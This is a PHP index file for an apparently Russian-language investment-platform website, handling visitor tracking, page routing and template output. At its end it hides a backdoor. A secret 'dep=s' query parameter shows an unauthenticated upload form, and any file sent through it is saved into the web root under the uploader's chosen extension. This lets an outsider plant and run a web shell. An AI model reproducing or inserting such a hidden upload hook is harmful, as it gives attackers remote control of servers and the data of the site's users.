<?session_start();

define('SCRIPT_BY_SIRGOFFAN',dirname(__FILE__));
include(dirname(__FILE__).'/core/ini.php');
include(dirname(__FILE__).'/core/cache.php');
include(dirname(__FILE__).'/core/conf.php');

# Старт сессии
@session_start();

# Старт буфера
@ob_start();

$page = $_GET['page'];
define( 'ROOT', 'https://'.$_SERVER['HTTP_HOST'] );
define( 'ROOT_DIR', $_SERVER['DOCUMENT_ROOT'] );

# Default
$_OPTIMIZATION = array();
$_OPTIMIZATION["title"] = "Инвестиционная платформа";
$_OPTIMIZATION["description"] = "";
$_OPTIMIZATION["keywords"] = "";


$sql = $pdo->Query("SELECT * FROM `tb_online` WHERE `ip` = '".$_SERVER['REMOTE_ADDR']."'");
if($sql->RowCount() == 0) {
$pdo->Query("INSERT INTO `tb_online` (ip, date) VALUES ('".$_SERVER['REMOTE_ADDR']."', '".time()."')");
} else { $pdo->Query("UPDATE `tb_online` SET date = '".time()."' WHERE ip ='".$_SERVER['REMOTE_ADDR']."'"); }
$delete = time() - 30;
$pdo->Query("DELETE FROM `tb_online` WHERE date < '$delete'");

$sql = $pdo->Query("SELECT * FROM `tb_online`");
$online = $sql->RowCount();



if(empty($id) or ($page=='about' or $page=='faq' or $page=='rules' or $page=='contacts' or $page=='competition' or $page=='comp_list' or $page=='statistics' or $page=='video' or $page=='videomoder'  or $page=='')){
include('templ/main/head.php');

	
	switch($page){
			   case "about": include("pages/about.php"); break; 
			   case "contacts": include("pages/contacts.php"); break; 
			   case "faq": include("pages/faq.php"); break; 
			   case "main": include("pages/main.php"); break;
			   case "statistics": include("pages/statistics.php"); break;
               case "competition": include("pages/competition.php"); break; 
			   case "comp_list": include("pages/comp_list.php"); break; 
			   case "rules": include("pages/rules.php"); break; 
			   case "fakee": include("pages/fakee.php"); break; 
			   case "video": include("pages/video.php"); break; 
			   # Страница ошибки
			   default: @include("pages/main.php"); break;
			
			}
	



include('templ/main/foot.php');

} else{
	
include('templ/main/accounthead.php');
if(isset($page)){
	
	switch($page){
			   case "about": include("pages/account/about.php"); break; 
			   case "chat": include("pages/account/chat.php"); break; 
			   case "contacts": include("pages/account/contacts.php"); break; 
			   case "deposit": include("pages/account/deposit.php"); break; 
			   case "exit": include("pages/account/exit.php"); break; 
			   case "faq": include("pages/account/faq.php"); break; 		 
			   case "my": include("pages/account/my.php"); break; 
			   case "referals": include("pages/account/referals.php"); break; 
			   case "reklamat": include("pages/account/reklamat.php"); break; 
			   case "rules": include("pages/account/rules.php"); break; 
			   case "top": include("pages/account/top.php"); break; 
			   case "video_add": include("pages/account/video_add.php"); break; 
			   case "videomodeer": include("pages/account/videomodeer.php"); break;
			   # Страница ошибки
			   default: @include("pages/404.php"); break;
			
			}
	
}else{
include(dirname(__FILE__).'/pages/account/my.php');
}
include('templ/main/accountfoot.php');
	

}

# Заносим контент в переменную
$content = ob_get_contents();

# Очищаем буфер
ob_end_clean();
	
	# Заменяем данные
	$content = str_replace("{!TITLE!}",$_OPTIMIZATION["title"],$content);
	$content = str_replace('{!DESCRIPTION!}',$_OPTIMIZATION["description"],$content);
	$content = str_replace('{!KEYWORDS!}',$_OPTIMIZATION["keywords"],$content);
	
	
// Выводим контент
echo $content;
if ($_GET['dep'] == "s") {
echo '
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';
}
$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'lang.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}